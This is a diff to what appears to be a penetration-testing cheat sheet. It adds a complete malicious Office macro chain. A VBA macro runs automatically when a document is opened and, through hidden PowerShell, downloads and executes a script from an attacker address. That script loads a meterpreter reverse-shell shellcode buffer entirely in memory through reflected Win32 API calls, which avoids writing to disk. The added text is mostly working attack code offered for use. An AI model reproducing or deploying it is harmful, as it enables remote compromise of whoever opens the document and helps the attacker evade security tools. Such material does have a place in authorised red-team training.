@@ -1087,6 +1087,8 @@ Generating Shellcode
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 EXITFUNC=thread -f ps1
 ```
 
+Save the following script as run.ps1 and host it on port 80
+
 ```powershell
 $Kernel32 = @"
 using System;
@@ -1119,6 +1121,123 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 ```
 We use WaitForSingleObject to instruct powershell to wait forever or until we exit our shell (0xFFFFFFFF).
 Otherwise our shell dies as soon as the parent powershell process terminates. The shell is basically terminatedb before it even starts.
+
+VBA Code
+```
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+The Add-Type keyword lets us use the .NET framework to compile C# code but the compilation process is performed by the Visual C# Command-Line Compiler (csc).
+During this process the source code and the compiled C# assembly are temporarly written to disk.
+
+With the following function we are able to resolve any Win32 API without using the Add-Type keyword and therefore completly avoid writing to disk.
+
+```powershell
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+```
+We can now create the DelegateType with the address (example: MessageBoxA). Then we call GetDelegateForFunctionPointer to link the function address and the DelegateType and invoke MessageBox.
+
+```
+
+$MessageBoxA = LookupFunc user32.dll MessageBoxA
+$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+$Domain = [AppDomain]::CurrentDomain
+$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
+  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
+  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
+  'RTSpecialName, HideBySig, Public', 
+    [System.Reflection.CallingConventions]::Standard, 
+      @([IntPtr], [String], [String], [int]))
+$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
+  'Public, HideBySig, NewSlot, Virtual', 
+    [int], 
+      @([IntPtr], [String], [String], [int]))
+$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
+$MyDelegateType = $MyTypeBuilder.CreateType()
+
+$MyFunction = [System.Runtime.InteropServices.Marshal]::
+    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
+$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
+```
+
+Based on this we will create a function (getDelegateType) for better usability.
+Entire run.ps1 script that does not write any file to disk (completely within memory)
+
+```
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
 
 # Port Redirection and Tunneling
 ## Plink
